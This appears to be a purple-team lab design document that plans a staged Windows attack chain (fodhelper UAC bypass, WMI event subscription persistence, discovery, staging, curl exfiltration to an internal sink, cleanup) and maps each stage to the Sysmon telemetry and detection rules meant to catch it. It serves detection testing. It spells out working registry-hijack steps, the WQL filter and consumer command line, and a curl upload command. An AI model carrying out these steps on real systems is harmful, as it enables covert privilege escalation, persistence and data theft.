# Attack Chain Plan — WMI Persistence + UAC Bypass (WMI-LAB-1)

> Canonical design of the S1–S7 chain. **Design intent, not recorded results** —
> recorded results live in run ledgers (`evidence/runs/RUN-<id>/`). Each stage follows
> the same card: machines/roles/accounts · files · commands · expected telemetry ·
> evidence to collect · boundary (what this stage does NOT prove) · failure handling.
> Operator actions (launching `setup.bat`, starting `notepad.exe`) are declared
> explicitly; they have a parent the agent chain never shows.

Chain summary: a normal local user (member of local Administrators, filtered token)
double-clicks `setup.bat`; fodhelper-driven UAC bypass elevates a hidden PowerShell
that writes a consumer script and installs a WMI event subscription; opening
`notepad.exe` fires the filter, the consumer runs as SYSTEM and performs discovery,
collection, staging, archiving, exfil to an internal sink, and cleanup.

| Stage | Behavior | Technique | Rules that observe it |
|---|---|---|---|
| S1 | Entry: user double-clicks `setup.bat` | T1059.003 (context) | none dedicated (operator action declared) |
| S2 | UAC bypass: ms-settings registry hijack → fodhelper → script host → elevated PowerShell | T1548.002, T1059.005/.001 | R1 (registry), C1/S1 (fodhelper child), S2 (PS flags) |
| S3 | Persistence install: write consumer, register WMI filter/consumer/binding | T1546.003 | C2 (19/20/21); the consumer PS also matches S2/S3/R2 (overlap documented) |
| S4 | Activation: notepad.exe fires filter → consumer under WmiPrvSE as SYSTEM | T1546.003 | R2 (registration→interpreter), S3, C3 (discovery part) |
| S5 | Discovery + collection + staging + manifest | T1082/T1016/T1087.001, T1005/T1074.001 | C3 (discovery), staging creates feed C4 |
| S6 | Archive + exfil to internal sink (curl) + status message (PS) | T1560.001, T1567 surrogate | C4 (archive create), S4 (curl upload-intent + connection), receipt (transfer) |
| S7 | Cleanup: delete staging + archive; history clearing | T1070.004 | C5 (archive create → delete; same-path verifier-checked) |

## Environment

| Host | Role | Notes |
|---|---|---|
| `victim` (Windows 10/11 Pro, workgroup, no AD) | The personal-host victim | `victim` account = local admin with filtered token (medium integrity) — the fodhelper prerequisite. Standalone single host. |
| `lab` (the repo host) | Elastic/Kibana + internal sink | Runs `scripts/sink_server.py`, the run ledger directory, and (optionally) Elastic. ES credentials via environment only. |

Traffic: the guest reaches the sink over the lab network on a dedicated port
(default 9180, documented per run). No external service is contacted; Telegram and
other external channels are **out of scope by design** (§F).

Run-scoped staging: `scripts/prepare_run.ps1` substitutes the run id, sink base and
host into a copy of the payloads under `evidence/runs/<run_id>/payload/` and prints
the staged consumer sha256 (indexed as ART-01-02). The guest runs that staged copy;
S3's EID 11 `Hash` of the materialized `svhw.ps1` is cross-checked against the
staged hash (module-integrity link, §1.4).

## S1 — Entry

- Who: operator action = simulate the user double-clicking `setup.bat` (or real
  double-click on the guest console). Declared as operator action.
- Files: `payloads/setup.bat` (built for the run, run-scoped config embedded).
- Expected telemetry: E1 `cmd.exe` (parent = Explorer or the acting process).
- Evidence: the cmd E1 (es_id + time).
- Boundary: delivery (phishing page → download → click) is **out of scope by
  design**; entry starts at script execution. NOT a detection claim.
- Failure: if E1 cmd absent → SENSOR GAP / run aborted, re-check Sysmon ingest.

## S2 — UAC bypass (fodhelper)

- Who: `setup.bat` (cmd) under the victim account.
- Files: temporary VBS proxy written to `%TEMP%\r.vbs`; registry key
  `HKCU\Software\Classes\ms-settings\Shell\Open\command`.
- Commands (sequence): write VBS → `reg add` default value (wscript proxy) →
  `reg add DelegateExecute ""` → `start fodhelper.exe` → wait for read → delete key
  and VBS.
- Expected telemetry: EID 13 ValueSet (Twice: default + DelegateExecute, TargetObject
  under `ms-settings\Shell\Open\command`), E1 `fodhelper.exe` (parent cmd), E1
  `wscript.exe` (parent fodhelper), E1 `powershell.exe` (`-WindowStyle Hidden
  -ExecutionPolicy Bypass -File ...install.ps1`, parent wscript).
- Evidence: EID 13 x2, E1 fodhelper, E1 wscript, E1 powershell — all with
  `@timestamp`; entity join fodhelper→wscript.
- Boundary: the registry→fodhelper link is TEMPORAL/CONTEXTUAL (no shared identity
  field); the elevated token is not read from any event predicate — elevation becomes
  *observable* only when S4 shows the consumer under SYSTEM.
- Failure: if EID 13 for the key is absent because the key was created+deleted too
  fast, keep the run but mark S2 PARTIAL (missing registry evidence), do not fabricate.

## S3 — Persistence install (WMI subscription)

- Who: hidden elevated PowerShell (from S2), victim account elevated.
- Files: `payloads/consumer.ps1` → written to `C:\Windows\Temp\svhw.ps1`.
- Commands: `Set-Content svhw.ps1` (EID 11), then `Set-WmiInstance`
  `__EventFilter` (Name NotepadFilter, WQL `SELECT * FROM __InstanceCreationEvent
  WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name =
  'notepad.exe'`), `CommandLineEventConsumer` (SystemDumpConsumer,
  `powershell.exe -ep bypass -w hidden -noni -f "C:\Windows\Temp\svhw.ps1"`),
  `__FilterToConsumerBinding` — idempotent: remove any prior subscription first.
- Expected telemetry: EID 11 (svhw.ps1), EID 19 (filter Created), EID 20 (consumer
  Created), EID 21 (binding Created), all on the same host.
- Evidence: 19/20/21 rows (es_id/timestamps) + binding cross-check
  (21.Consumer⇄20.Name, 21.Filter⇄19.Name) per `correlation-architecture.md`.
- Boundary: **registration ≠ activation ≠ reboot survival.** None of these three is
  implied by the other.
- Failure: `Set-WmiInstance` errors → consumer/filter absent → retry after cleaning
  prior objects (idempotent delete-then-create), record both attempts.

## S4 — Activation

- Who: operator action = start `notepad.exe` (or the victim opens it).
- Expected telemetry: E1 `notepad.exe`; then E1 `powershell.exe` whose parent is
  `WmiPrvSE.exe`, user SYSTEM, command line ends with
  `-f "C:\Windows\Temp\svhw.ps1"`; optional WMI-Activity channel row (when enabled).
- Evidence: notepad E1 + WmiPrvSE-parented PS E1 (entity join WmiPrvSE→PS), a
  `register`/`decision` row for the activation gate.
- Boundary: activation proves the subscription fires for the trigger; it does NOT
  prove the subscription survives reboot, and consumer-name provenance is not
  verified by name alone.
- Failure: no WmiPrvSE-parented PS within ~60 s → filter/consumer misconfigured;
  inspect EID 19 Query + 20 Destination, fix, re-run the stage (record the retry).

## S5 — Discovery + collection + staging + manifest

- Who: consumer powershell, SYSTEM.
- Commands (inside `svhw.ps1`): OS/network/account queries (Get-CimInstance /
  Get-NetIPAddress / Get-LocalUser / arp), then copy candidate files from the user
  profile into `C:\Windows\Temp\wdmp\`, write `info.txt` and `_manifest.txt`.
- Expected telemetry: E1 `arp.exe` (SYSTEM, parent powershell), EID 11 for
  `info.txt`, `_manifest.txt` and each copied file under `\Windows\Temp\`.
- Evidence: arp E1 + EID 11 rows (paths, sizes, hashes for scripts).
- Boundary (per §D/§F): EID 11 creates in the staging dir do not prove collection of
  source documents; generated `info.txt` / `_manifest.txt` satisfy C4's first
  predicate regardless of source collection. `Get-*` results are in-process and not
  independently evidenced (declared limitation, not compensated).
- Failure: empty staging dir → size guard aborts before archiving; record the error
  message to the sink status channel.

## S6 — Archive + exfil to internal sink

- Who: consumer powershell, SYSTEM; `curl.exe` child.
- Commands: `Compress-Archive wdmp\* → wdmp.zip` (EID 11); compute zip sha256 and
  append to `_manifest.txt`; `curl.exe -s -F file=@wdmp.zip -F run=<run_id>
  -F host=<host> http://<lab>:9180/upload` (E1 curl, parent powershell; E3 curl to
  sink port); one PowerShell status message to the sink (`Invoke-RestMethod`, E3 PS
  — this is the traffic C4/C5's PowerShell network stage may match).
- Evidence: E1 curl + E3 curl (entity-owned), sink receipt `ART-07-01`
  (server-side: received name/size/sha256 + embedded manifest snapshot) — the only
  transfer-success evidence; E3 PS status + (optional) C4 alert logged in the ledger.
- Boundary: the E3 does not prove transfer; a C4/C5 match on the status channel must
  not be described as archive transfer without receipt + alert-source attribution.
- Failure: curl non-zero or sink missing file → receipt absent → S6 FAIL, do not
  mark PASS.

## S7 — Cleanup

- Who: consumer powershell spawns `cmd /c ... rd wdmp & del wdmp.zip`.
- Expected telemetry: E1 cmd (parent powershell, SYSTEM), EID 23 for `wdmp.zip` and
  staging files (cmd, SYSTEM); history `Clear-Content` (no Sysmon delete event).
- Evidence: EID 23 row(s) + a cleanup verification artifact `ART-08-01`
  (post-cleanup probe: `wdmp.zip` absent, subscription still present or removed,
  processes gone).
- Boundary: deletion does not prove transfer success (receipt does); per-artifact
  cleanup only; `Clear-Content` is truncation, not deletion, and is declared out of
  the event evidence.
- Failure: leftovers detected by the probe → S7 NOT PASS until clean-up re-run.

## Timing & gate discipline (§2.3/§E)

- All timestamps come from real events at build time; nothing is fabricated; when a
  time is approximate, the ledger row says `timing approximate (<source>)`.
- Gates: S2 after S1 evidence seen; S3 after S2's elevated PS E1; S4 after S3's EID
  21; S5–S6 after activation E1; S7 after receipt exists.
- Retried attempts are recorded as separate evidence rows with their own timestamps
  (never overwritten).
- Per-run artifacts land in the run-scoped ledger; run id is verified *inside* each
  artifact, not just the folder name.

## References

- `correlation-architecture.md` — join keys, tiers, boundaries, sensor checklist.
- `detections/README.md` — rule index and detection-basis citations.
- `evidence/runs/RUN-schema.json` — ledger schema.
- `scripts/verify/verify_run_evidence.py` — acceptance assertions per stage.
- `docs/architecture.md` — lab topology, telemetry path, sink.